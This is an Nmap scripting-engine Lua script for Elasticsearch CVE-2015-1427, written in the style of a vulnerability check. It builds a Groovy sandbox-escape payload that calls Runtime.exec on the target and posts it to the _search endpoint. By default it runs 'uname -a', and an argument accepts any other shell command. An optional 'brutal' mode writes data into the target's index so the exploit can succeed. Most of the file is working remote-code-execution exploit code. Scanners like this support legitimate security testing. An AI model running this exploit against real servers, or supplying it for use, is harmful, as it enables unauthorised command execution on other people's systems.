local http = require "http"
local url  = require "url"
local shortport = require "shortport"
local stdnse = require "stdnse"
local string = require "string"
local table = require "table"
local vulns = require "vulns"
local json  = require "json"

description = [[
A simple script based on the exploit mentioned here :
  http://carnal0wnage.attackresearch.com/2015/03/elasticsearch-cve-2015-1427-rce-exploit.html
  The vulnerability allows an attacker to construct Groovy scripts that escape the sandbox and 
  execute shell commands as the user running the Elasticsearch Java VM
]]

---
-- @args command enter the shell command to be executed
-- tries to fetch the os details by default
-- @args brutal if set to true then creates an index incase one is not present.
-- @usage
-- nmap --script=http-vuln-cve2015-1427 --script-args command='ls' <targets>
--
--@output
--  | http-vuln-cve2015-1427: 
-- |   VULNERABLE:
-- |   ElasticSearch CVE-2015-1427 RCE Exploit
-- |     State: VULNERABLE (Exploitable)
-- |     IDs:  CVE:CVE-2015-1427
-- |     Risk factor: High
-- |     Description:
-- |       The vulnerability allows an attacker to construct Groovy scripts that escape the sandbox and execute 
-- |           shell commands as the user running the Elasticsearch Java VM.
-- |     Exploit results:
-- |       bin
-- |   config
-- |   data
-- |   lib
-- |   LICENSE.txt
-- |   logs
-- |   NOTICE.txt
-- |   README.textile
-- |   
-- |     References:
-- |       https://github.com/elastic/elasticsearch/issues/9655
-- |       https://jordan-wright.github.io/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/
-- |       http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1427
-- |_      http://carnal0wnage.attackresearch.com/2015/03/elasticsearch-cve-2015-1427-rce-exploit.html
-- ISSUE : if index not present you need to rerun the script :/
--reated 13/3/15

author = "Gyanendra Mishra"

license = "Same as Nmap--See http://nmap.org/book/man-legal.html"

categories = {"vuln", "intrusive"}

portrule = shortport.port_or_service(9200, "http", "tcp")


local function parseResult(parsed)
  -- for commands that return printable results : -
  if parsed.hits.hits[1] and parsed.hits.hits[1].fields and parsed.hits.hits[1].fields.exploit[1] then
    return parsed.hits.hits[1].fields.exploit[1]
  end
  -- mkdir(etc) command seems to work but as it returns no result
  if parsed.hits.total > 0 then
    return "Likely vulnerable. Command entered gave no output to print. Use without command argument to ensure vulnerability."
  end    
  return false
end    

action = function(host, port)
  
  local command = stdnse.get_script_args(SCRIPT_NAME .. ".command") or false 
  local brutal = stdnse.get_script_args(SCRIPT_NAME .. ".brutal") or false

  local payload
  if not(command) then
    payload = {
    size= 1,
    query= {
        match_all= {}
    },
    script_fields= {
        exploit= {
            lang= "groovy",
            script= "java.lang.Math.class.forName(\"java.util.Scanner\").getConstructor(java.lang.Math.class.forName(\"java.io.InputStream\")).newInstance(java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"uname -a\").getInputStream()).useDelimiter(\"\\\\A\").next()"
        }
    }
   } 
  else
    payload = {
    size= 1,
    query= {
        match_all= {}
    },
    script_fields= {
        exploit= {
            lang= "groovy",
            script= "java.lang.Math.class.forName(\"java.util.Scanner\").getConstructor(java.lang.Math.class.forName(\"java.io.InputStream\")).newInstance(java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"" .. command .. "\").getInputStream()).useDelimiter(\"\\\\A\").next()"
        }
    }
   }
  end

  local json_payload = json.generate(payload)

  local vuln_table = {
    title = "ElasticSearch CVE-2015-1427 RCE Exploit",
    state = vulns.STATE.NOT_VULN,
    risk_factor = "High",
    references = {
      'http://carnal0wnage.attackresearch.com/2015/03/elasticsearch-cve-2015-1427-rce-exploit.html',
      'https://jordan-wright.github.io/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/',
      'https://github.com/elastic/elasticsearch/issues/9655'
    },
    IDS = {
      CVE = 'CVE-2015-1427'
    },
    description = [[The vulnerability allows an attacker to construct Groovy scripts that escape the sandbox and execute 
    shell commands as the user running the Elasticsearch Java VM.]]
  }

  local report = vulns.Report:new(SCRIPT_NAME, host, port)
  
  -- check if it is indexed, if not create index
  local response = http.get(host,port,'_cat/indices')
  -- put requires rerun to show content why?
  if not(response.status == 200) or response.body == '' then
      if brutal then
        local data = { 
          user = "dilbert", 
          postDate = "2015-03-10", 
          body = "Nmap Rocks. Doesn't it?" ,
          title = "Exploitem"
        }
        response = http.put(host,port,'blog/post/1',nil,json.generate(data))
        if not(response.status == 201) then 
          stdnse.print_debug(1,"Didnt have any index. Creating index failed.")
          return nil
        end
        response = http.get(host,port,'_cat/indices')
        if not(response.status == 200) or response.body == '' then
          stdnse.print_debug(1,"Try rerunning the script once. Brual could create index.")
          return nil
        end  
      else 
        stdnse.print_debug(1,"Not Indexed. Try the brutal option ;)")
        return nil   
      end  
  end
        
  --execute the command
  
  local target = '_search?pretty'
  response = http.post(host,port,target,nil,nil,(json_payload))

  if not(response.body) or not(response.status==200) then
    return nil
  else
    local status,parsed = json.parse(response.body)
    if ( not(status) ) then
      stdnse.print_debug(1,"JSON not parsable.")
      return nil
    end
    --if the parseResult function returns something then lets go ahead..
    local results  = parseResult(parsed)
    if  results then 
      vuln_table.state = vulns.STATE.EXPLOIT
      vuln_table.exploit_results = results
    end
  end
  
  return report:make_output(vuln_table) 
end